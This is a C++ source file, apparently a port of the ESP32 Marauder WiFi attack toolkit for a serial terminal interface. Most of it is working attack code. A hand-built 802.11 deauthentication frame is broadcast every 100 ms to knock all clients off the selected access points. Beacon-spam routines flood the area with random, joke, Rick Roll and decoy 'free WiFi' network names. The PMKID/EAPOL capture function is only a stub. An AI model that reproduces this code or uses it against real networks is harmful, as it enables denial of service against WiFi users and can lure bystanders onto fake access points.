/**
 * ESP32 Marauder TUI - WiFi Attacks Implementation
 * 
 * Ported from ESP32 Marauder WiFiScan with minimal dependencies
 */

#include "WiFiAttacks.h"
#include "SerialTUI.h"
#include <esp_random.h>

// ============================================
// Frame Templates
// ============================================

// Deauthentication frame template
const uint8_t deauthFrame[26] = {
    0xC0, 0x00,                          // Frame Control (deauth)
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (to be filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (to be filled)
    0x00, 0x00,                          // Sequence
    0x07, 0x00                           // Reason code (class 3 frame)
};

// Beacon frame template  
const uint8_t beaconFrame[128] = {
    0x80, 0x00,                          // Frame Control (beacon)
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (random)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (same as source)
    0x00, 0x00,                          // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
    0x64, 0x00,                          // Beacon interval
    0x01, 0x04,                          // Capability info
    0x00                                 // SSID tag
};

// Rick Roll SSIDs
const char* rickRollSSIDs[8] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"
};

// Funny SSIDs
const char* funnySSIDs[12] = {
    "FBI Surveillance Van",
    "Pretty Fly for a WiFi",
    "Wu-Tang LAN",
    "Bill Wi the Science Fi",
    "The LAN Before Time",
    "Drop It Like Its Hotspot",
    "LAN Solo",
    "The Promised LAN",
    "Nacho WiFi",
    "Get Off My LAN",
    "Titanic Syncing",
    "Winternet is Coming"
};

// Character set for random SSID
const char ssidChars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

// Global callback context
static WiFiAttacks* _callbackInstance = nullptr;

WiFiAttacks wifiAttacks;

// ============================================
// WiFiAttacks Implementation
// ============================================

void WiFiAttacks::begin() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(false);
    _mode = WiFiMode::IDLE;
    _channel = DEFAULT_CHANNEL;
    _callbackInstance = this;
    
    // Add some default SSIDs for beacon spam
    addSSID("FreeWiFi");
    addSSID("CoffeeShop_Guest");
    addSSID("Airport_Free_WiFi");
}

void WiFiAttacks::update() {
    if (_mode == WiFiMode::IDLE) return;
    
    uint32_t now = millis();
    
    switch (_mode) {
        case WiFiMode::ATTACK_DEAUTH:
            if (now - _lastUpdate > 100) {
                sendDeauthToAll();
                _lastUpdate = now;
            }
            break;
            
        case WiFiMode::ATTACK_BEACON_RANDOM:
            if (now - _lastUpdate > 100) {
                sendRandomBeacon();
                _lastUpdate = now;
            }
            break;
            
        case WiFiMode::ATTACK_BEACON_LIST:
        case WiFiMode::ATTACK_RICKROLL:
        case WiFiMode::ATTACK_FUNNY:
            if (now - _lastUpdate > 100) {
                sendListBeacon();
                _lastUpdate = now;
            }
            break;
            
        default:
            break;
    }
}

void WiFiAttacks::stop() {
    esp_wifi_set_promiscuous(false);
    
    char buf[64];
    snprintf(buf, sizeof(buf), "Stopped. Packets: %lu", _packetCount);
    tui.printStatus(buf);
    
    _mode = WiFiMode::IDLE;
    _packetCount = 0;
}

// ============================================
// Scanning Functions
// ============================================

void WiFiAttacks::startScanAP() {
    _mode = WiFiMode::SCAN_AP;
    _accessPoints.clear();
    
    tui.printStatus("Scanning for APs...");
    
    int n = WiFi.scanNetworks(false, true);
    
    for (int i = 0; i < n && i < MAX_APS; i++) {
        AccessPoint ap;
        ap.essid = WiFi.SSID(i);
        memcpy(ap.bssid, WiFi.BSSID(i), 6);
        ap.channel = WiFi.channel(i);
        ap.rssi = WiFi.RSSI(i);
        ap.selected = false;
        _accessPoints.add(ap);
        
        char buf[64];
        snprintf(buf, sizeof(buf), "[%d] %s (Ch:%d, %ddBm)", 
                 i, ap.essid.c_str(), ap.channel, ap.rssi);
        tui.printResult(buf);
    }
    
    char buf[32];
    snprintf(buf, sizeof(buf), "Found %d APs", n);
    tui.printStatus(buf);
    
    _mode = WiFiMode::IDLE;
}

void WiFiAttacks::startScanStation() {
    _mode = WiFiMode::SCAN_STATION;
    tui.printStatus("Station scan requires promiscuous mode sniffing...");
    _mode = WiFiMode::IDLE;
}

void WiFiAttacks::startSniffBeacon() {
    _mode = WiFiMode::SNIFF_BEACON;
    _packetCount = 0;
    tui.printStatus("Sniffing beacons (press any key to stop)...");
}

void WiFiAttacks::startSniffProbe() {
    _mode = WiFiMode::SNIFF_PROBE;
    _packetCount = 0;
    tui.printStatus("Sniffing probe requests (press any key to stop)...");
}

void WiFiAttacks::startSniffDeauth() {
    _mode = WiFiMode::SNIFF_DEAUTH;
    _packetCount = 0;
    tui.printStatus("Sniffing deauth packets (press any key to stop)...");
}

void WiFiAttacks::startSniffPMKID() {
    _mode = WiFiMode::SNIFF_PMKID;
    _packetCount = 0;
    tui.printStatus("Capturing PMKID/EAPOL (press any key to stop)...");
}

void WiFiAttacks::startSniffPwn() {
    _mode = WiFiMode::SNIFF_PWN;
    _packetCount = 0;
    tui.printStatus("Sniffing for Pwnagotchi (press any key to stop)...");
}

void WiFiAttacks::startSniffRaw() {
    _mode = WiFiMode::SNIFF_RAW;
    _packetCount = 0;
    tui.printStatus("Raw packet sniffing (press any key to stop)...");
}

// ============================================
// Attack Functions
// ============================================

void WiFiAttacks::startDeauth() {
    _mode = WiFiMode::ATTACK_DEAUTH;
    _packetCount = 0;
    _lastUpdate = millis();
    tui.printStatus("Deauth attack started (press any key to stop)...");
}

void WiFiAttacks::startBeaconRandom() {
    _mode = WiFiMode::ATTACK_BEACON_RANDOM;
    _packetCount = 0;
    _lastUpdate = millis();
    tui.printStatus("Random beacon spam started (press any key to stop)...");
}

void WiFiAttacks::startBeaconList() {
    _mode = WiFiMode::ATTACK_BEACON_LIST;
    _packetCount = 0;
    _lastUpdate = millis();
    tui.printStatus("Beacon list spam started (press any key to stop)...");
}

void WiFiAttacks::startRickRoll() {
    _mode = WiFiMode::ATTACK_RICKROLL;
    _packetCount = 0;
    _lastUpdate = millis();
    
    // Load Rick Roll SSIDs
    _ssids.clear();
    for (int i = 0; i < 8; i++) {
        SSID s;
        s.name = rickRollSSIDs[i];
        s.selected = true;
        _ssids.add(s);
    }
    
    tui.printStatus("Rick Roll beacon spam started!");
}

void WiFiAttacks::startFunnyBeacon() {
    _mode = WiFiMode::ATTACK_FUNNY;
    _packetCount = 0;
    _lastUpdate = millis();
    
    // Load funny SSIDs
    _ssids.clear();
    for (int i = 0; i < 12; i++) {
        SSID s;
        s.name = funnySSIDs[i];
        s.selected = true;
        _ssids.add(s);
    }
    
    tui.printStatus("Funny beacon spam started!");
}

// ============================================
// Frame Sending
// ============================================

void WiFiAttacks::sendDeauthToAll() {
    for (int i = 0; i < _accessPoints.size(); i++) {
        AccessPoint ap = _accessPoints.get(i);
        if (ap.selected) {
            // Send deauth to broadcast (all clients)
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            sendDeauthFrame(ap.bssid, broadcast, ap.channel);
            _packetCount++;
        }
    }
}

void WiFiAttacks::sendDeauthFrame(const uint8_t* ap, const uint8_t* client, uint8_t channel) {
    uint8_t packet[26];
    memcpy(packet, deauthFrame, 26);
    
    // Set destination (client)
    memcpy(&packet[4], client, 6);
    // Set source (AP)
    memcpy(&packet[10], ap, 6);
    // Set BSSID (AP)
    memcpy(&packet[16], ap, 6);
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void WiFiAttacks::sendRandomBeacon() {
    // Generate random SSID
    char ssid[32];
    int len = 8 + (esp_random() % 16);
    for (int i = 0; i < len; i++) {
        ssid[i] = ssidChars[esp_random() % (sizeof(ssidChars) - 1)];
    }
    ssid[len] = '\0';
    
    sendBeaconFrame(ssid, _channel);
    _packetCount++;
}

void WiFiAttacks::sendListBeacon() {
    static int idx = 0;
    
    if (_ssids.size() > 0) {
        SSID s = _ssids.get(idx);
        sendBeaconFrame(s.name.c_str(), _channel);
        _packetCount++;
        idx = (idx + 1) % _ssids.size();
    }
}

void WiFiAttacks::sendBeaconFrame(const char* ssid, uint8_t channel) {
    uint8_t packet[128];
    memcpy(packet, beaconFrame, 36);
    
    // Generate random source MAC
    for (int i = 0; i < 6; i++) {
        packet[10 + i] = esp_random() & 0xFF;
    }
    packet[10] |= 0x02;  // Local bit
    
    // Copy to BSSID
    memcpy(&packet[16], &packet[10], 6);
    
    // Add SSID
    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    
    packet[36] = 0x00;  // SSID tag
    packet[37] = ssidLen;
    memcpy(&packet[38], ssid, ssidLen);
    
    // Supported rates tag
    int pos = 38 + ssidLen;
    packet[pos++] = 0x01;  // Supported rates tag
    packet[pos++] = 0x08;  // 8 rates
    packet[pos++] = 0x82; packet[pos++] = 0x84;
    packet[pos++] = 0x8b; packet[pos++] = 0x96;
    packet[pos++] = 0x24; packet[pos++] = 0x30;
    packet[pos++] = 0x48; packet[pos++] = 0x6c;
    
    // Channel tag
    packet[pos++] = 0x03;  // DS Parameter Set
    packet[pos++] = 0x01;  // Length
    packet[pos++] = channel;
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ============================================
// Channel Management
// ============================================

void WiFiAttacks::setChannel(uint8_t channel) {
    if (channel >= 1 && channel <= MAX_CHANNEL) {
        _channel = channel;
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
}

// ============================================
// Target Management
// ============================================

void WiFiAttacks::selectAP(uint8_t index, bool selected) {
    if (index < _accessPoints.size()) {
        AccessPoint ap = _accessPoints.get(index);
        ap.selected = selected;
        _accessPoints.set(index, ap);
    }
}

void WiFiAttacks::addSSID(const char* ssid) {
    if (_ssids.size() < MAX_SSIDS) {
        SSID s;
        s.name = ssid;
        s.selected = true;
        _ssids.add(s);
    }
}

void WiFiAttacks::clearAll() {
    _accessPoints.clear();
    _stations.clear();
    _ssids.clear();
    tui.printStatus("All targets cleared");
}

// ============================================
// Helpers
// ============================================

String WiFiAttacks::macToString(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}